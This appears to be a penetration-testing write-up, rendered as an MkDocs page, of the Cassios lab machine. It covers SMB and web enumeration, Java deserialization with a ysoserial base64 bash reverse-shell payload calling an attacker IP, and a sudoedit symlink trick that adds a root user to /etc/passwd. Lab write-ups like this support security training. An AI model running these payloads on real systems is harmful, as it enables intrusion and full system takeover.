+  <a href="#nmap-host-script" class="md-nav__link">
+    Nmap + Host Script
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smbclient" class="md-nav__link">
+    SMBClient
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smbmapsmbclient" class="md-nav__link">
+    SMBMap/SMBClient
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-enumeration-80-8080" class="md-nav__link">
+    Web Enumeration (80, 8080)
+  </a>
+  
+    <nav class="md-nav" aria-label="Web Enumeration (80, 8080)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#browser-enumeration-port-80" class="md-nav__link">
+    Browser Enumeration Port 80
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#browser-enumeration-port-8080" class="md-nav__link">
+    Browser Enumeration Port 8080
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#directory-busting-port-80" class="md-nav__link">
+    Directory Busting Port 80
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#directory-busting-port-8080" class="md-nav__link">
+    Directory Busting Port 8080
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#intial-foot-hold" class="md-nav__link">
+    Intial Foot Hold
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    RE101
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            RE101
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../RE101/3.%20Simple%20Lambdas/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    3. Simple Lambdas
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Random Thoughts
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            Random Thoughts
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Random_Thoughts/010622-1824/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Network Pentest or... not?
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Building a Personal Containerized Web Pentest Lab
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password Management with Self-Hosted KeeWeb
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ports-scan" class="md-nav__link">
+    Ports Scan
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssh-enumeration-22" class="md-nav__link">
+    SSH Enumeration (22)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-enumeration-139445" class="md-nav__link">
+    SMB Enumeration (139,445)
+  </a>
+  
+    <nav class="md-nav" aria-label="SMB Enumeration (139,445)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap-host-script" class="md-nav__link">
+    Nmap + Host Script
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smbclient" class="md-nav__link">
+    SMBClient
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smbmapsmbclient" class="md-nav__link">
+    SMBMap/SMBClient
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-enumeration-80-8080" class="md-nav__link">
+    Web Enumeration (80, 8080)
+  </a>
+  
+    <nav class="md-nav" aria-label="Web Enumeration (80, 8080)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#browser-enumeration-port-80" class="md-nav__link">
+    Browser Enumeration Port 80
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#browser-enumeration-port-8080" class="md-nav__link">
+    Browser Enumeration Port 8080
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#directory-busting-port-80" class="md-nav__link">
+    Directory Busting Port 80
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#directory-busting-port-8080" class="md-nav__link">
+    Directory Busting Port 8080
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#intial-foot-hold" class="md-nav__link">
+    Intial Foot Hold
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="cassios">Cassios<a class="headerlink" href="#cassios" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>OffSec Difficulty : Intermediate | Community Difficulty : Very Hard | Personal Rating : Intermediate</p>
+</blockquote>
+<p>If you pay close attention to detail, you will be done before lunch. Otherwise, you will also be done before lunch... next week. </p>
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<h3 id="ports-scan">Ports Scan<a class="headerlink" href="#ports-scan" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>python3 autorecon.py 192.168.127.116
+</code></pre></div>
+<p><strong>Open Ports</strong> 
+<div class="highlight"><pre><span></span><code>22/tcp   open  ssh         syn-ack OpenSSH 7.4 (protocol 2.0)
+80/tcp   open  http        syn-ack Apache httpd 2.4.6 ((CentOS))
+139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: SAMBA)
+445/tcp  open  netbios-ssn syn-ack Samba smbd 4.10.4 (workgroup: SAMBA)
+8080/tcp open  http-proxy  syn-ack
+</code></pre></div></p>
+<h3 id="ssh-enumeration-22">SSH Enumeration (22)<a class="headerlink" href="#ssh-enumeration-22" title="Permanent link">&para;</a></h3>
+<p>From the enumeration of SSH, we see that OpenSSH_7.4 is used, and various authentication methods are supported here. However, nothing significant to exploit apart from brute forcing which did not work.
+<div class="highlight"><pre><span></span><code>22/tcp open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
+|_banner: SSH-2.0-OpenSSH_7.4
+| ssh-auth-methods: 
+|   Supported authentication methods: 
+|     publickey
+|     gssapi-keyex
+|     gssapi-with-mic
+|_    password
+| ssh2-enum-algos: 
+|   kex_algorithms: (12)
+... 
+...
+</code></pre></div></p>
+<h3 id="smb-enumeration-139445">SMB Enumeration (139,445)<a class="headerlink" href="#smb-enumeration-139445" title="Permanent link">&para;</a></h3>
+<p>Below is an extracted version of the scan result, we can see that there is a share "Samantha Konstan" that we seem to have anonymous READ/WRITE permission for.</p>
+<h4 id="nmap-host-script">Nmap + Host Script<a class="headerlink" href="#nmap-host-script" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>139/tcp open  netbios-ssn syn-ack Samba smbd 4.10.4 (workgroup: SAMBA)
+Service Info: Host: CASSIOS
+
+445/tcp open  netbios-ssn syn-ack Samba smbd 4.10.4 (workgroup: SAMBA)
+Service Info: Host: CASSIOS
+
+| smb-enum-shares: 
+|   account_used: &lt;blank&gt;
+|   \\192.168.127.116\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (Samba 4.10.4)
+|     Users: 3
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|   \\192.168.127.116\Samantha Konstan: 
+|     Type: STYPE_DISKTREE
+|     Comment: Backups and Recycler files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\home\samantha\backups
+|     Anonymous access: READ/WRITE
+|   \\192.168.127.116\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\var\lib\samba\drivers
+|_    Anonymous access: &lt;none&gt;
+| smb-ls: Volume \\192.168.127.116\Samantha Konstan
+|   maxfiles limit reached (10)
+| SIZE   TIME                 FILENAME
+| &lt;DIR&gt;  2023-02-05T06:33:43  .
+| &lt;DIR&gt;  2020-09-24T17:38:10  ..
+| 0      2020-09-24T01:35:15  recycler.ser
+| 478    2020-09-24T17:32:50  readme.txt
+| &lt;DIR&gt;  2020-09-24T17:36:11  spring-mvc-quickstart-archetype
+| 4778   2020-09-24T17:35:01  spring-mvc-quickstart-archetype\README.md
+| 774    2020-09-24T17:35:01  spring-mvc-quickstart-archetype\archetype-catalog.xml
+| &lt;DIR&gt;  2020-09-24T17:35:01  spring-mvc-quickstart-archetype\src
+| 1732   2020-09-24T17:36:11  spring-mvc-quickstart-archetype\pom.xml
+| &lt;DIR&gt;  2020-09-24T17:36:54  thymeleafexamples-layouts
+|_
+</code></pre></div>
+<p>Host script was also able to list the files and we see a <code>readme.txt</code> and a <code>recycler.ser</code> file which might be interesting.</p>
+<h4 id="smbclient">SMBClient<a class="headerlink" href="#smbclient" title="Permanent link">&para;</a></h4>
+<p>From SMBClient, we found out that the "Samantha Konstan" drive is a back up share.
+<div class="highlight"><pre><span></span><code>Anonymous login successful
+
+Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+Samantha Konstan Disk      Backups and Recycler files
+IPC$            IPC       IPC Service (Samba 4.10.4)
+</code></pre></div></p>
+<h4 id="smbmapsmbclient">SMBMap/SMBClient<a class="headerlink" href="#smbmapsmbclient" title="Permanent link">&para;</a></h4>
+<p><div class="highlight"><pre><span></span><code>smbmap -H 192.168.127.116 -R --depth 2 --exclude ADMIN$ IPC$ C$ -A readme
+</code></pre></div>
+Following this <a href="![Pasted image 20230205154206.png](&lt;Media/Pasted image 20230205154206.png&gt;)">guide</a> we downloaded the 2 interesting files using the command above and we read the readme file.</p>
+<p><img alt="Pasted image 20230205154132.png" src="../Media/Pasted%20image%2020230205154132.png" /></p>
+<p>We cofirmed upload permission 
+<div class="highlight"><pre><span></span><code><span class="c1"># connect to smb</span>
+smbclient<span class="w"> </span>//192.168.127.116/<span class="s2">&quot;Samantha Konstan&quot;</span>
+<span class="c1">#inside smb shell</span>
+smb:<span class="w"> </span>&gt;<span class="w"> </span>put<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>file&gt;<span class="w"> </span>&lt;remote<span class="w"> </span>file<span class="w"> </span>name&gt;
+</code></pre></div></p>
+<p><img alt="Pasted image 20230205155957.png" src="../Media/Pasted%20image%2020230205155957.png" /></p>
+<h3 id="web-enumeration-80-8080">Web Enumeration (80, 8080)<a class="headerlink" href="#web-enumeration-80-8080" title="Permanent link">&para;</a></h3>
+<h4 id="browser-enumeration-port-80">Browser Enumeration Port 80<a class="headerlink" href="#browser-enumeration-port-80" title="Permanent link">&para;</a></h4>
+<p>"Sign Up" function does not seem to be working.
+<img alt="Pasted image 20230205160806.png" src="../Media/Pasted%20image%2020230205160806.png" /></p>
+<h4 id="browser-enumeration-port-8080">Browser Enumeration Port 8080<a class="headerlink" href="#browser-enumeration-port-8080" title="Permanent link">&para;</a></h4>
+<p>This seems to be the app that the <code>readme.txt</code> is for.
+<img alt="Pasted image 20230205160637.png" src="../Media/Pasted%20image%2020230205160637.png" />
+And we will need to use a username and password to access the dashboard.
+<img alt="Pasted image 20230205160955.png" src="../Media/Pasted%20image%2020230205160955.png" /></p>
+<h4 id="directory-busting-port-80">Directory Busting Port 80<a class="headerlink" href="#directory-busting-port-80" title="Permanent link">&para;</a></h4>
+<p>From the results below we see some intersting output <code>/backup_migrate</code>
+<img alt="Pasted image 20230205161327.png" src="../Media/Pasted%20image%2020230205161327.png" />
+<img alt="Pasted image 20230205161339.png" src="../Media/Pasted%20image%2020230205161339.png" /></p>
+<p>When we visited we are given a directory listing seen below:
+<img alt="Pasted image 20230205161512.png" src="../Media/Pasted%20image%2020230205161512.png" /></p>
+<p>Decompressing the recyler.tar is the source code and in this path <code>src/main/java/com/industrial/recycler/</code>, we find <code>WebSecurityConfig.java</code> file which contains username and password possibly for the webapp at port 8080.
+<code>recycler:DoNotMessWithTheRecycler123</code>.</p>
+<p><img alt="Pasted image 20230205162836.png" src="../Media/Pasted%20image%2020230205162836.png" /></p>
+<h4 id="directory-busting-port-8080">Directory Busting Port 8080<a class="headerlink" href="#directory-busting-port-8080" title="Permanent link">&para;</a></h4>
+<p>Nothing interesting here other than the login page.
+<img alt="Pasted image 20230205161403.png" src="../Media/Pasted%20image%2020230205161403.png" /></p>
+<p>We login with the credentials given above and we get these 3 buttons which we do not know what it does.</p>
+<p><img alt="Pasted image 20230205163022.png" src="../Media/Pasted%20image%2020230205163022.png" /></p>
+<h2 id="intial-foot-hold">Intial Foot Hold<a class="headerlink" href="#intial-foot-hold" title="Permanent link">&para;</a></h2>
+<p>We look to the source code <code>src/main/java/com/industrial/recycler/DashboardController.java</code>  </p>
+<p><strong>Check function</strong></p>
+<p><img alt="Pasted image 20230205163232.png" src="../Media/Pasted%20image%2020230205163232.png" /></p>
+<p><strong>Save function</strong></p>
+<p><img alt="Pasted image 20230205163247.png" src="../Media/Pasted%20image%2020230205163247.png" /></p>
+<p>We realised that this app is reading input from <code>/home/samantha/backups/recycler.ser</code> with the "check" button and writing output to <code>recycler.ser</code> with the "save" button.</p>
+<p>To confirm that the file that we have SMB access to is written when we click on the "save" button we login with SMBClient to view the file. <code>recycler.ser</code> has been altered.</p>
+<p><img alt="Pasted image 20230205163447.png" src="../Media/Pasted%20image%2020230205163447.png" /></p>
+<p>We check what <code>.ser</code> file is and as can be seen below, .SER files are used to store serialized objects. </p>
+<p><img alt="Pasted image 20230205163728.png" src="../Media/Pasted%20image%2020230205163728.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+<span class="w">     </span><span class="n">in</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span>
+<span class="w">     </span><span class="n">r</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Recycler</span><span class="p">)</span><span class="w"> </span><span class="n">in</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+<span class="w">     </span><span class="n">in</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+<span class="w">     </span><span class="p">}</span><span class="w"> </span>
+<span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="n">ex</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>From the code above, we see that there is no sanitization of serialized object. <code>recycler.ser</code> file is passed as a file name into <code>fis</code> File object which is then passed as an input object <code>in</code> which is then passed as a serialised object <code>r</code> by the <a href="https://portswigger.net/web-security/deserialization/exploiting"><code>readObject()</code> function</a> which is vulnerable.</p>
+<p>We use <a href="https://github.com/frohoff/ysoserial">ysoserial</a> together with a <a href="https://book.hacktricks.xyz/pentesting-web/deserialization#ysoserial">hacktricks cheatsheet</a> to generate the payload. (Java 16 and 17 will have issues running ysoserial) </p>
+<p>Base64 encoded bash reverse shell payload.</p>
+<p><img alt="Pasted image 20230205172338.png" src="../Media/Pasted%20image%2020230205172338.png" /></p>
+<div class="highlight"><pre><span></span><code>java<span class="w"> </span>-jar<span class="w"> </span>ysoserial-master-SNAPSHOT.jar<span class="w"> </span>CommonsCollections4<span class="w"> </span><span class="s2">&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjEyNy80NDMgMD4mMQ==}|{base64,-d}|{bash,-i}&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>recycler.ser
+</code></pre></div>
+<p>With smbclient we modified the original <code>recycler.ser</code> using the <code>PUT</code> command.</p>
+<p><img alt="Pasted image 20230205172654.png" src="../Media/Pasted%20image%2020230205172654.png" /></p>
+<p>We click on check status and we get the reverse shell with user privilege .</p>
+<p><img alt="Pasted image 20230205172814.png" src="../Media/Pasted%20image%2020230205172814.png" /></p>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<p>We uploaded and executed linpeas and we are given a few results that could lead to privilege escalation.</p>
+<p><img alt="Pasted image 20230205220438.png" src="../Media/Pasted%20image%2020230205220438.png" /></p>
+<p>The most probable result would be the one below as running a local exploit for privilege escalation is not offsec...</p>
+<p><img alt="Pasted image 20230205220406.png" src="../Media/Pasted%20image%2020230205220406.png" /></p>
+<p>The pattern for the above <a href="https://linux.die.net/man/8/sudoedit">sudoedit</a> permissions looks similar to the one found <a href="https://www.exploit-db.com/exploits/37710">here</a>. In our version to exploit, we will need to :</p>
+<ol>
+<li>create a subdirectory within the home folder and the file has to be named <code>recycler.ser</code></li>
+<li>create a symbolic link to the a new file named <code>recycler.ser</code> in the new folder pointing to the file that requires privileged access.</li>
+<li>run <code>sudoedit /home/directory/recycler.ser</code> with super user privilege.</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="c1">#generate /etc/passwd username and password hash.</span>
+openssl<span class="w"> </span>passwd<span class="w"> </span>-1<span class="w"> </span>-salt<span class="w"> </span>cyberches<span class="w"> </span>pwnpwn
+
+<span class="c1">#carry out sudoedit exploit to edit /etc/passwd file</span>
+mkdir<span class="w"> </span>/home/samantha/privesc
+ln<span class="w"> </span>-s<span class="w"> </span>/etc/passwd<span class="w"> </span>/home/samantha/privesc/recycler.ser
+sudoedit<span class="w"> </span>/home/samantha/privesc/recycler.ser
+<span class="c1"># in VIM G+A then add the below</span>
+<span class="c1"># cyberches:$1$cyberche$8SlOq4I5fdCWAmXseBSIU0:0:0:/root:/bin/bash</span>
+<span class="c1"># afterwards esc + enter then &quot;:wq&quot; enter</span>
+</code></pre></div>
+<p>After adding the credentials to the last line of <code>/etc/passwd</code>, we will do a <code>su cyberches</code>, enter the credentials and we got root!</p>
+<p><img alt="Pasted image 20230205230316.png" src="../Media/Pasted%20image%2020230205230316.png" /></p>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.81fa17fe.min.js"></script>
+      
+    
+  </body>
+</html>
